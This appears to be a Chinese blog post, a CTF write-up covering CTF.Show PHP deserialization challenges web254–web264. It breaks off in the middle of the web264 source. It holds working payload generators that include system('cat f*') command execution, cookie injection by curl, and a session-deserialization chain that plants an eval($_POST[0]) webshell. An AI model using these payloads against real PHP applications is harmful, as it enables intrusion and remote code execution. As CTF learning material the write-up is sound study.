@@ -1,0 +1,893 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://guo.moe/favicon.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://guo.moe/favicon.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guo.moe","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":true,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="web254本题目基于 PHP7.3.11 做法草，我一开始还以为username要用对象传进去，原来那个xxxxxx就是，那没事了。 直接访问 &#x2F;?username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx 即可">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【Klee-CTF】CTF.Show Web入门 PHP 反序列化 web254~web267">
+<meta property="og:url" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize.html">
+<meta property="og:site_name" content="果果说">
+<meta property="og:description" content="web254本题目基于 PHP7.3.11 做法草，我一开始还以为username要用对象传进去，原来那个xxxxxx就是，那没事了。 直接访问 &#x2F;?username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx 即可">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%201.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%202.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%203.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%204.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%205.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%206.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%207.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%208.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%209.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2010.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2011.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2012.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2013.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2014.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2015.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2016.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2017.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2018.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2019.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2020.png">
+<meta property="article:published_time" content="2021-08-30T04:00:00.000Z">
+<meta property="article:modified_time" content="2021-08-30T12:28:36.000Z">
+<meta property="article:author" content="Guoguo">
+<meta property="article:tag" content="果果说">
+<meta property="article:tag" content="果果的博客">
+<meta property="article:tag" content="Guoguo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled.png">
+
+<link rel="canonical" href="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>【Klee-CTF】CTF.Show Web入门 PHP 反序列化 web254~web267 | 果果说</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-69554402-1"></script>
+    <script data-pjax>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-69554402-1');
+      }
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="果果说" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">果果说</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Guoguo's Blog</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-友情链接">
+
+    <a href="/links/" rel="section"><i class="fa fa-user fa-fw"></i>友情链接</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://guo.moe/favicon.jpg">
+      <meta itemprop="name" content="Guoguo">
+      <meta itemprop="description" content="找不到路，就自己走一条出来。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="果果说">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          【Klee-CTF】CTF.Show Web入门 PHP 反序列化 web254~web267
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-08-30 12:00:00 / 修改时间：20:28:36" itemprop="dateCreated datePublished" datetime="2021-08-30T12:00:00+08:00">2021-08-30</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/" itemprop="url" rel="index"><span itemprop="name">技术篇</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h1><p><code>本题目基于 PHP7.3.11</code></p>
+<h2 id="做法"><a href="#做法" class="headerlink" title="做法"></a>做法</h2><p>草，我一开始还以为username要用对象传进去，原来那个xxxxxx就是，那没事了。</p>
+<p>直接访问 /?username=xxxxxx&amp;password=xxxxxx 即可</p>
+<span id="more"></span>
+
+<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled.png"></p>
+<h1 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h1><p><code>本题目基于 PHP7.3.11</code></p>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>PHP的对象序列化</li>
+</ul>
+<h2 id="做法-1"><a href="#做法-1" class="headerlink" title="做法"></a>做法</h2><p>设username为test，password为test，<del>注意php反序列化必须将对象内容全部设置完毕，不然不会成功反序列化。</del>好像也不是，回去再试试</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public $isVip;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ctf = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line">$ctf-&gt;username = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">$ctf-&gt;password = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">$ctf-&gt;isVip = <span class="literal">true</span>;</span><br><span class="line">echo serialize($ctf);</span><br><span class="line"><span class="comment">// O:11:&quot;ctfShowUser&quot;:3:&#123;s:8:&quot;username&quot;;s:4:&quot;test&quot;;s:8:&quot;password&quot;;s:4:&quot;test&quot;;s:5:&quot;isVip&quot;;b:1;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>再注意丢去urlencode，得</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A11%3A%22ctfShowUser%<span class="number">22</span>%3A3%3A%7Bs%3A8%3A%22username%<span class="number">22</span>%3Bs%3A4%3A%22test%<span class="number">22</span>%3Bs%3A8%3A%22password%<span class="number">22</span>%3Bs%3A4%3A%22test%<span class="number">22</span>%3Bs%3A5%3A%22isVip%<span class="number">22</span>%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure>
+
+<p>放到header，Cookie: user=xxx</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl --location --request GET <span class="string">&#x27;http://55dfc84a-386d-4d27-aa29-872ad23e4c1b.challenge.ctf.show:8080/?username=test&amp;password=test&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;Cookie: user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22test%22%3Bs%3A8%3A%22password%22%3Bs%3A4%3A%22test%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>your flag is ctfshow{106d93e8-fdba-4ce3-9ea2-6e9dd7e76250}</p>
+<h1 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h1><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>细心的判断</li>
+</ul>
+<h2 id="做法-2"><a href="#做法-2" class="headerlink" title="做法"></a>做法</h2><p>麻痹的，这题还有个判断条件</p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%201.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%201.png"></p>
+<p>将上题中所设的password改为test1获得flag</p>
+<h1 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h1><h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>通过PHP序列化覆盖 ctfShowUser 中的 class 变量</li>
+<li>间接修改 backDoor 中的 code 变量</li>
+</ul>
+<h2 id="做法-3"><a href="#做法-3" class="headerlink" title="做法"></a>做法</h2><p><a target="_blank" rel="noopener" href="https://www.fatalerrors.org/a/ctfshow-deserialization.html">https://www.fatalerrors.org/a/ctfshow-deserialization.html</a></p>
+<p>按照该网站上的做法，</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    private $class;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $this-&gt;<span class="class"><span class="keyword">class</span></span>=<span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    private $code=<span class="string">&#x27;system(&quot;cat f*&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$b=<span class="keyword">new</span> ctfShowUser();</span><br><span class="line">echo urlencode(serialize($b));</span><br></pre></td></tr></table></figure>
+
+<p>但我无法复现，即使是改为这样</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    private $class = <span class="string">&#x27;backDoor&#x27;</span>; <span class="comment">// 修改class为backDoor方便调用</span></span><br><span class="line">    private $username=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    private $password=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    private $isVip=<span class="literal">true</span>; <span class="comment">// 改不改好像没所谓，这里题目没有判断</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $this-&gt;<span class="class"><span class="keyword">class</span></span>=<span class="keyword">new</span> backDoor(); <span class="comment">// construct也要覆盖修改一下</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    private $code=<span class="string">&#x27;system(&quot;cat f*&quot;);&#x27;</span>; <span class="comment">// 提前设置好backDoor的code，关键时刻可以</span></span><br><span class="line">&#125;</span><br><span class="line">$b=<span class="keyword">new</span> ctfShowUser();</span><br><span class="line">echo urlencode(serialize($b));</span><br></pre></td></tr></table></figure>
+
+<p>破案了，你妈将postman输出改成pretty就好了</p>
+<p>（问题：这里construct函数也可以被覆盖吗？还是说因为construct将class给覆盖了？serialize会自动忽略construct函数吗？）</p>
+<h1 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h1><h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>PHP的序列化</li>
+</ul>
+<h2 id="做法-4"><a href="#做法-4" class="headerlink" title="做法"></a>做法</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    public $text = <span class="string">&quot;ctfshow_i_love_36D&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$object = <span class="keyword">new</span> A();</span><br><span class="line">echo serialize($object);</span><br></pre></td></tr></table></figure>
+
+<p>/?ctfshow=O:1:”A”:1:{s:4:”text”;s:18:”ctfshow_i_love_36D”;}</p>
+<h1 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h1><p><code>本题目基于 PHP5.6.40</code></p>
+<h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>PHP序列化</li>
+<li>修改 Cookie（editthiscookie）</li>
+<li>base64编码</li>
+</ul>
+<h2 id="做法-5"><a href="#做法-5" class="headerlink" title="做法"></a>做法</h2><p>这题原来放在 /message.php 了，亏我还找半天这个 index.php 怎么注入。。。</p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%202.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%202.png"></p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%203.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%203.png"></p>
+<p>该题关键在于将 msg 的 token 设置为 admin</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$m</span> = <span class="keyword">new</span> message(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$m</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%204.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%204.png"></p>
+<p>成功拿到flag</p>
+<h1 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h1><p><code>本题目基于 PHP7.3.11</code></p>
+<h2 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>利用字符串拼接注入</li>
+<li>PHP Session 的反序列化漏洞</li>
+<li>备份文件的压缩文件命名</li>
+</ul>
+<h2 id="做法-6"><a href="#做法-6" class="headerlink" title="做法"></a>做法</h2><p>看了 wp，存在<a target="_blank" rel="noopener" href="http://www.zip,这指定了类型的谁想得到啊(晕/">www.zip，这指定了类型的谁想得到啊（晕</a></p>
+<p>然后以为可以用通配符蒙混过关（/inc/inc.php），顺便试了一下sqlmap，结果发现有拦截sql注入</p>
+<p>然后发现editthiscookie不好用了，弄得我以为是自己写的问题，坑啊</p>
+<p>关注到 /inc/inc.php 上有一行</p>
+<p><code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code></p>
+<p>参考资料：<a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/04/21/PHP-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://www.mi1k7ea.com/2019/04/21/PHP-session反序列化漏洞/</a></p>
+<p>php 以 | 作为 key和value的分隔符。此处的User中destruct方法有一个file_put_contents，在session反序列化过程中可以利用到User这一个类。</p>
+<p>构造下面的文件来尝试是否产生文件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&quot;test.php&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&quot;&lt;?php&quot;</span> . <span class="string">&#x27; phpinfo(); ?&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">&quot;|&quot;</span> . serialize(<span class="variable">$u</span>));</span><br></pre></td></tr></table></figure>
+
+<p>将输出的内容放入 cookies 中的 limit 字段，需要注意的是，在放入之前cookies需要先存在 PHPSESSID 字段及 limit 字段（先访问一次index.php，替换完以后再访问一次index.php），然后再访问（check.php）。</p>
+<p>最后访问 log-test.php，查看是否生成 phpinfo();</p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%205.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%205.png"></p>
+<p>可以看到是正常生成的。将内容改为 </p>
+<p><code>&lt;?php eval($POST[0]); ?&gt;</code>  （设置为’x’不知道为什么没法传进去，设置为0就好了）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&quot;test1.php&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&quot;&lt;?php&quot;</span> . <span class="string">&#x27; eval($_POST[0]); ?&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">&quot;|&quot;</span> . serialize(<span class="variable">$u</span>));</span><br></pre></td></tr></table></figure>
+
+<p>使用 AntSword </p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%206.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%206.png"></p>
+<p>配置完右键打开flag.php拿到flag</p>
+<h1 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h1><p><code>本题目基于 PHP 5.6.40</code></p>
+<h2 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>PHP的反序列化逃逸（字符串变长）</li>
+</ul>
+<h2 id="做法-7"><a href="#做法-7" class="headerlink" title="做法"></a>做法</h2><p>原题代码：index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 02:37:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 16:05:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@message</span>.php</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span 